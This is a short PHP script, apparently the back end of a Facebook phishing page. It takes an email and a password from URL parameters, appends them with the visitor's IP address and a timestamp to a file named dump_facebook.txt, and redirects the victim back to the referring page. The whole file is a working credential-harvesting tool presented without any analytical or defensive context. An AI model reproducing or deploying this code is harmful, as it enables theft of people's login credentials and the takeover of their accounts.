<?php
$datum = date('d-m-Y / h:i:s a');
$email = $_GET[e];
$password = $_GET[p];
$ip = getenv('REMOTE_ADDR');
$fl = fopen('dump_facebook.txt', 'a');
fwrite($fl, "IP Address : $ip\nDate : $datum\nUsername : $email\nPassword : $password\n\n");
fclose($fl);
$ref = $_SERVER['HTTP_REFERER'];
header("location: $ref");
?>